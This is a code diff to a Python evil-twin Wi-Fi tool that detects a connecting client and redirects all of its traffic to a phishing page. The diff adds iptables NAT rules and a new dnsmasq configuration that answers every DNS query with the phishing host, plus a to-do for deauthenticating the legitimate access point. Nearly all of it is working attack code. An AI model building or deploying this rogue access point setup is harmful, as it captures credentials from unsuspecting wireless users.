@@ -7,6 +7,9 @@
 # connection will change iptables rules and deny access
 # to the internet - but allow access to a phishing page.
 #
+# Todo:
+# Include deauth of AP
+# Choose phising page
 
 
 import argparse
@@ -205,6 +208,7 @@ def check_connections():
             if checker != 1:
                 print('\t[!]  Client connected. Starting captive. Client: ' + connected_client)
                 iptables_captive()
+                # dnsmasq_captive()  # Alternative to using iptables for captive
                 checker = 1
         except:
             if checker == 1:
@@ -228,13 +232,32 @@ def iptables_captive():
     """Cleaning up rules in iptables and redirecting to phising."""
     cleanup_iptables()
     os.system('iptables -t mangle -N captiveportal')
-    os.system('iptables -t mangle -A PREROUTING -i ' + sop.int_mon + ' -p udp --dport 53 -j RETURN')
+    # os.system('iptables -t mangle -A PREROUTING -i ' + sop.int_mon + ' -p udp --dport 53 -j RETURN')
     os.system('iptables -t mangle -A PREROUTING -i ' + sop.int_mon + ' -j captiveportal')
     os.system('iptables -t mangle -A captiveportal -j MARK --set-mark 1')
-    os.system('iptables -t nat -A PREROUTING -i ' + sop.int_mon + '  -p tcp -m mark --mark 1 -j DNAT --to-destination ' + sop.webphis)
+    os.system('iptables -t nat -A PREROUTING -i ' + sop.int_mon + '  -p tcp -m mark --mark 1 -j DNAT --to-destination ' + sop.webphis)  # --dport 80
     os.system('sysctl -w net.ipv4.ip_forward=1')
     os.system('iptables -A FORWARD -i ' + sop.int_mon + ' -j ACCEPT')
     os.system('iptables -t nat -A POSTROUTING -o ' + sop.int_net + ' -j MASQUERADE')
+
+
+def dnsmasq_captive():
+    """Alternative solution instead of using iptables."""
+    # dnsmasq.conf
+    dnsconf = ('interface=' + sop.int_mon + '\n')
+    dnsconf += ('dhcp-range=10.0.0.10,10.0.0.250,12h' + '\n')
+    dnsconf += ('dhcp-option=3,10.0.0.1' + '\n')
+    dnsconf += ('dhcp-option=6,10.0.0.1' + '\n')
+    dnsconf += ('server=8.8.8.8' + '\n')
+    dnsconf += ('log-queries' + '\n')
+    dnsconf += ('log-dhcp' + '\n')
+    dnsconf += ('no-hosts' + '\n')
+    dnsconf += ('no-resolv' + '\n')
+    dnsconf += ('address=/#/' + sop.webphis)
+    with open('tmp/dnsmasq.conf', 'w') as file:
+        file.write(dnsconf)
+    os.system('killall dnsmasq')
+    comm.runCommand('dnsmasq -C tmp/dnsmasq.conf -d', 'dnsmasq')
 
 
 def cleanup_system():
